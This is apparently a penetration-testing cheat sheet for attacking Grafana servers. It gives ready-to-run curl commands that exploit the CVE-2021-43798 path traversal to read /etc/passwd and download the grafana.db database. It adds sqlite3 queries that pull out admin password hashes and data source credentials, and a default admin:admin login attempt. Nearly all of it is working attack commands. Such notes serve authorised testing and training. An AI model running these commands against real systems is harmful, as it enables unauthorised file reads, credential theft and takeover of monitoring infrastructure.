# Grafana

### Identify Grafana version

Usually on port 3000 — Check login page

```bash
curl -s http://$IP:3000/api/health
```

---

### Grafana LFI (CVE-2021-43798)

Unauthenticated arbitrary file read — Grafana 8.0.0 - 8.3.0

```bash
curl --path-as-is "http://$IP:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
# Try different plugins: graph, dashlist, table, text, pluginlist
```

---

### Read Grafana database for creds

Grab the SQLite database — Contains admin password hash and data source creds

```bash
curl --path-as-is "http://$IP:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
sqlite3 grafana.db "SELECT login,password,salt FROM user;"
sqlite3 grafana.db "SELECT name,type,url,user,password,basic_auth_password FROM data_source;"
```

---

### Default credentials

Try before anything else — Often unchanged

```bash
# admin:admin
curl -u admin:admin http://$IP:3000/api/org
```

---
